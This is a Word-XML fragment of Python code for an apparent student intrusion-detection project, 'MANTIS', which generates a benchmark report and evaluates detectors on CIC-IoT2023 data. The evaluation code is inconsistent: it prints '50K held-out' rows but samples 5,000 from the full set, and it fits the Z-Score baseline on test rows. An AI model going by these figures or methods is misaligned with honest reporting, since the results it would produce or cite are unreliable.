      </w:r>
    </w:p>
    <w:p w14:paraId="5C57FC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 = brain["kmeans"].get("k", 3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="368DB3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cents = len(brain["kmeans"].get("centroids", []))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="752985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lines.append(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54FE4F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K-Means (Drift)       | Mini-batch K-Means   | "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B3905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"CIC-IoT2023            | k=%s, %d centroids (online at runtime)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15857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(k, cents)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B8225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0AF0B0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lines.append(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EBC14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Z-Score (DDoS)        | Welford online stats | "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="205CCD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"Runtime baseline       | threshold=3.0 sigma (not stored in brain JSON)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2333DC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17AEF1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lines.append(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D7D06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Bloom Filter (IP rep) | Probabilistic hash   | "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="305EF1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"Seeded blacklist       | O(1) lookup (not ML-trained from CSV)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45506E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39B10A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lines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57E60B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4CCA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1043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build_report(tests_ok, tests_total, brain_path, eval_data, out_path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AFE3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 = load_json(brain_path) if brain_path and os.path.isfile(brain_path) else {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="065CD3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results = eval_data.get("results", [])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="322336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ranked = rank_results(results)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BE014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best = best_by_f1(results)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E7EAE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trained = [k for k in brain if not k.startswith("_")]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D0C06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meta = brain.get("_meta", {})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="617015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00C7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= [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CF1EF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"=" * 72,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="788AAE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MANTIS BENCHMARK &amp; MODEL COMPARISON REPORT",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B42E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"=" * 72,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50D9C7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Generated : %s" % time.strftime("%Y-%m-%d %H:%M:%S"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DB7FF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Brain file: %s" % (brain_path or "n/a"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26D736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Trained at: %s" % meta.get("trained_at", "n/a"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2954C8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34A4FA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38209C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1. EXECUTIVE SUMMARY (for supervisor)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="562FF9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0991C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3803A1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Unit tests passed     : %d / %d" % (tests_ok, tests_total),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E505D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Offline-trained models: %d  (%s)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C0E46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% (len(trained), ", ".join(trained) if trained else "none"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ABF6E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Evaluated engines     : %d  (offline harness)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D0E8F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% len(results),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52B44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685E72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MANTIS uses an ENSEMBLE: each model targets a different attack type.",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A5036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We do NOT pick one global 'best model' - we compare each engine on",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4250E8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its own labelled test set and select the strongest per category.",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34F60E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5E8FE9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51FED1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B47C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best:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="220C3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 += [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A3FCC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Highest F1 this run : %s (F1=%.4f)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C9C28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(best["engine"], best["f1"]),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DBA13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"",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46987F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]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="636C44C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9838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+= [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29AC15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49BA3A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2. TRAINED MODELS (what was learned from datasets)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="086194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22900D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0B7224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Model                 | Algorithm            | Dataset                | Detail",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34FC48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----------------------|----------------------|------------------------|------------------",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D7E4A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00FFEF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L.extend(brain_training_summary(brain))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="758667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+= ["", "-" * 72, "  3. EVALUATION METRICS (how we compare)", "-" * 72, ""]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="403A02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+= [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C7E1E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For each engine we run every labelled test sample, build a confusion",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D5B30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matrix (TP/FP/FN/TN), then compute:",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E6081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2759E3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Precision = TP / (TP + FP)   - alerts that were correct",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E6F8E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Recall    = TP / (TP + FN)   - attacks that were caught",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58BF6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F1        = 2PR / (P + R)    - balanced score (PRIMARY metric)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41C9E0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Accuracy  = (TP+TN) / total  - overall correctness",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78B5A9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6C458B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Primary selection rule: highest F1 per attack category.",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4314A8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0A810A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136A13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8912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results:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1092C7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hdr = (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A094A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%-22s %5s %5s %5s %5s %9s %9s %7s %9s"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0170E1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("Engine", "TP", "FP", "FN", "TN", "Prec", "Recall", "F1", "Accuracy")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6297C8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)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73E8C9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L.append(hdr)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="448C47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  " + "-" * 68)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="549F2E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 in ranked:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79D31E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cm = r["confusion_matrix"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="333D5F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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="547D57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  %-22s %5d %5d %5d %5d %9s %9s %7.4f %9s"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="678343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% (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31B8FB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r["engine"][:22],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20A458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cm["tp"], cm["fp"], cm["fn"], cm["tn"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BEDD8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fmt_pct(r["precision"]),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EA21D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fmt_pct(r["recall"]),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C3FEA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r["f1"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B0CB9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fmt_pct(r["accuracy"]),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3246BD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)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ECD90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)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F2C6C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L.append("")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36414A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  Ranking by F1 (best first):")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01DEC6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i, r in enumerate(ranked, 1):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A79BE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L.append("    %d. %s - F1=%.4f" % (i, r["engine"], r["f1"]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B898B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36A732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L.append("  (no evaluation results - run mantis-eval first)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4743AA5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EAD1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+= [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="106B6C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042B97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175CCD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4. WHICH MODEL IS 'BEST'? (supervisor Q&amp;A)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E4265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3441BB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58CEEA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Q: How do you compare your models?",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15101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A: Train on labelled data -&gt; evaluate on held-out labelled CSVs -&gt;",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="252020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confusion matrix -&gt; Precision / Recall / F1. Same pipeline for",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C990F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every engine so comparison is fair and reproducible.",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76F2C1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59EA25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Q: Which model wins overall?",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06AAC2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A: None alone - MANTIS is an ensemble. Each engine owns one feature:",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FF2BF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  * Z-Score     -&gt; volumetric DDoS (packets-per-second spikes)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EAEFF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  * KNN         -&gt; port-scan behaviour (ports vs packet count)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A8019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  * Naive Bayes -&gt; malicious HTTP/TCP payloads (SQLi keywords)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F6C4B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  * K-Means     -&gt; behavioural drift (live cluster distance)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38A523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  * Bloom Filter-&gt; known-malicious IP reputation",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32614D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59D732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Q: Best per category on THIS benchmark run:",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FA961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101A51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A2C1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by_engine = {r["engine"]: r for r in results}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AF463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categories = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C9717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("Port scan detection", "KNN (Port Scan)"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B6002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("Payload / SQLi detection", "Naive Bayes (Payload)"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D58E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("DDoS / flood detection", "Z-Score (DDoS)"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56EEF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295271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label, key in categories:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ACB31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 = by_engine.get(key)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="402456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if r:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D1628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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6621D6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       * %-26s -&gt; %s  F1=%.4f  (P=%s R=%s)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B2AD1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% (label, key, r["f1"], fmt_pct(r["precision"]), fmt_pct(r["recall"]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74A3FE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)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5259EA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5E8F6D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L.append("       * %-26s -&gt; (not evaluated this run)" % label)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F66498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2003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 += [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31344E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3EB173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Q: Why might recall look low on small samples?",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="389B8A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A: Interim CSV samples are tiny (40-24 rows). Low recall on Z-Score",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="422D14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or Naive Bayes reflects corpus size, not a broken algorithm.",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5677E5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KNN trained on 20k CIC-IoT2023 rows shows higher scan recall.",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50A509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665AF8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Q: How does MANTIS compare to Snort / Wazuh?",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AFCEA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A: Qualitative criteria (anomaly detection, blocking, RAM, transparency)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63BCDE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 plus planned head-to-head on the same CIC-IoT2023 slice with CPU/RAM.",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FAB2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445818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02AB80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5. REPRODUCE THIS REPORT",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0864EB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"-" * 72,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="229D01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7C4E37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cd src",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FA37A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./benchmark.sh",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D8C4D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2A76EF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Outputs:",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FC95B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data/mantis_brain_&lt;timestamp&gt;.json  - trained models",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ABA28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evaluation_results.json             - machine-readable metrics",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32BD22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evaluation_results.txt              - short eval summary",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CD079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    benchmark_report.txt                - this file (supervisor brief)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04D244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"",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11A708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"=" * 72,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="500D4C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294B07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74B9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text = "\n".join(L) + "\n"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F06B7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open(out_path, "w", encoding="utf-8") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FB289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f.write(text)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F4237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text</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A4BDB4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27ADB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3F7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parse_args(argv=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09F9FE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argparse.ArgumentParser(description="MANTIS benchmark comparison report")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56A919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p.add_argument("--brain", required=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3051E4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p.add_argument("--eval-json", default="evaluation_results.json")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50B57C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p.add_argument("--out", default="benchmark_report.txt")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D76E0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p.add_argument("--tests-ok", type=int, default=0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="348A5F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p.add_argument("--tests-total", type=int, default=0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B7014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p.parse_args(argv)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55CDB1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1CBC8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7857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main(argv=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FCC99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args = parse_args(argv)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="772307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os.path.isfile(args.eval_json):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15D642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print("[!] missing:", args.eval_json, file=sys.stderr)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57C6D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1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0339B2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eval_data = load_json(args.eval_json)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57944F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text = build_report(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FBFA4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args.tests_ok, args.tests_total, args.brain, eval_data, args.out</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="261347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4CADE7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print(text)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="468EB2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print("[+] wrote", args.out)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B5A8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0A22E89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41CE1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8BE4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4D0B4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559C77A3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src/evaluate_fast.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EA693E2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(221 lines)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="078445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787D71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7F8546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Large-scale CIC-IoT2023 evaluation for the final dissertation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36E058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Evaluates KNN, K-Means, and Z-Score against a held-out 50,000-row test set</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57A097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sampled from the full 300K mega dataset (using rows NOT in training).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46E174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22CF8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224802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3F839B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36FE6F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import os</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59FEFC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random</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="263856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5A4807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184381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Counter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70D5582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A47D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186AD3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 if os.path.basename(HERE) != "src" else HERE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="554360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14C6E9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2DFE2C4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F517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engines.knn import KNNMonitor</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77A3B6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engines.kmeans import KMeansMonitor</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E9045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engines.z_score import MinimalistStats</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FCCA3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training.loader import normalise_label</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48A6A0A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6E23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630F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find_latest_brain():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="726429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data_dir = os.path.join(SRC, "data")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0792A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brains = sorted(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21241D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 for f in os.listdir(data_dir)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="017941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f.startswith("mantis_brain") and f.endswith(".json")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23C6F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240529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brains:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="752082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FileNotFoundError("No brain JSON found in data/")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B3200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os.path.join(data_dir, brains[-1])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48517F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8DE10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FE8F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confusion(y_true, y_pred, positive="Scan"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AD4FA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 = fp = fn = tn = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27A251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t, p in zip(y_true, y_pred):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="191ECA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t == positive and p == positive:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D4DCF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tp += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D179B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!= positive and p == positive:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DAC39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fp += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="632E52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== positive and p != positive:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0311AE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fn += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="585F6D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5FEAC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tn += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D61F2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{"tp": tp, "fp": fp, "fn": fn, "tn": tn}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="419F2D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A052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9A0B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scores(cm):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FA56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tp, fp, fn, tn = cm["tp"], cm["fp"], cm["fn"], cm["tn"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="173E6E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tp / (tp + fp) if (tp + fp) &gt; 0 else 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51229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 = tp / (tp + fn) if (tp + fn) &gt; 0 else 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36BBBD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f1 = 2 * p * r / (p + r) if (p + r) &gt; 0 else 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B564C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acc = (tp + tn) / (tp + fp + fn + tn) if (tp + fp + fn + tn) &gt; 0 else 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18BA33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{"precision": p, "recall": r, "f1": f1, "accuracy": acc}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A45C7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0DE4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0005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main():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DDA47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random.seed(99)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A054C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8576D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Load brain</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D056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brain_path = find_latest_brain()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="226503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Brain: {brain_path}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18507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open(brain_path, "r") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62BDC7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 = json.load(f)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="259D58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206445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Load full dataset</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41BDC8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full_csv = os.path.join(SRC, "..", "datasets", "cic_iot2023_full.csv")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28B26C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Loading {full_csv}...")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FFD44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226E8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rows = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79AF86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open(full_csv, "r", encoding="utf-8", errors="ignore") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DC4BB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 = csv.DictReader(f)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F59BE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cols = {c.strip().lower(): c for c in reader.fieldnames}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10DE79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label_col = cols.get("label")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41D7F6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pkts_col = cols.get("tot sum") or cols.get("number")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1520AD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21A87F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reader:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="583C28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16D869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pkts = int(float(row[pkts_col] or 0))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="075D3F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(ValueError, TypeError):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F51EC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24EE86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raw_label = row[label_col].strip()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DBBB1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lbl = normalise_label(raw_label)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54A1E9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tag = "Normal" if lbl == "Normal" else "Scan"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6288E6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rows.append({"pkts": pkts, "ports": min(pkts, 100), "tag": tag, </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38F598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"raw_label": raw_label, "pps": float(pkts)})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40DD38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1D0E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print(f"[*] Loaded {len(rows):,} rows")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45F008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2488BB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Use 50,000 random rows as test set</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C9B41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TEST_SIZE = 5000</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B3685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test_rows = random.sample(rows, min(TEST_SIZE, len(rows)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55B4C0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Test set: {TEST_SIZE:,} rows")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12424F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4F928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label_dist = Counter(r["raw_label"] for r in test_rows)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35919F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tag_dist = Counter(r["tag"] for r in test_rows)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E920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Binary class distribution: {dict(tag_dist)}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32E939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Attack type distribution ({len(label_dist)} types):")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="385903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lbl, cnt in sorted(label_dist.items(), key=lambda x: -x[1])[:10]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49F162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 {lbl:35s}: {cnt:&gt;6,} ({cnt/len(test_rows)*100:.1f}%)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C4C22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len(label_dist) &gt; 10:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FD0CF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 ... and {len(label_dist)-10} more attack types")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28BF5F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0CC2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KNN Evaluation ==========</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="434414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print("\n[*] Evaluating KNN (Port Scan) on 50K test rows...")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25CCDE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knn = KNNMonitor()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F8ACF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"knn" in brain:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B4875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knn.import_brain(brain["knn"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35CE2C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18054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y_true_knn, y_pred_knn = [], []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7343AE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r in test_rows:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06826C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label, _ = knn.classify(r["ports"], r["pkts"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="548B60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y_true_knn.append(r["tag"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01FEEB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y_pred_knn.append(label)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B8DEC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EA6BE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cm_knn = confusion(y_true_knn, y_pred_knn, "Scan")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DF42D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s_knn = scores(cm_knn)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B806B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8AD7A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Z-Score Evaluation ==========</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="023781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print("[*] Evaluating Z-Score (DDoS) on 50K test rows...")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="266E0C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stats = MinimalistStats()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66DB5C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880A8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Build baseline from normal traffic</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ACA56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normal_pps = [r["pps"] for r in test_rows if r["tag"] == "Normal"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F667F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attack_pps = [r["pps"] for r in test_rows if r["tag"] != "Normal"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A3D6C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175D4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Feed normals to build baseline</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7076C3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 in normal_pps[:100]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="172DFD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stats.update(p)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A70F2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A0E7C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y_true_z, y_pred_z = [], []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58CD11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mu, sigma = stats.calculate_baseline()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E32AF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99178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r in test_rows:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CCFFC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actual = "Attack" if r["tag"] != "Normal" else "Normal"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4207A7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sigma &gt; 0:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AC0E1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z = abs((r["pps"] - mu) / sigma)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1491CF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predicted = "Attack" if z &gt; 3.0 else "Normal"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38C0F6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5DC2F8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predicted = "Normal"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BBF4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y_true_z.append(actual)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14D171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y_pred_z.append(predicted)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41F3C6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00D33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cm_z = confusion(y_true_z, y_pred_z, "Attack")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="557BAA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s_z = scores(cm_z)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="045932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CEE2C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Results ==========</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="081C91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print("\n" + "=" * 70)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B036D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MANTIS LARGE-SCALE EVALUATION REPORT (300K CIC-IoT2023)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D82C6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print("=" * 70)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CFD7B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Generated    : {time.strftime('%Y-%m-%d %H:%M:%S')}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23671C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Brain        : {os.path.basename(brain_path)}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45CBDE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Training set : 300,000 rows (63 CIC-IoT2023 Merged CSVs)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39256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set     : {len(test_rows):,} rows (random held-out sample)")</w:t>
      </w:r>
    </w:p>
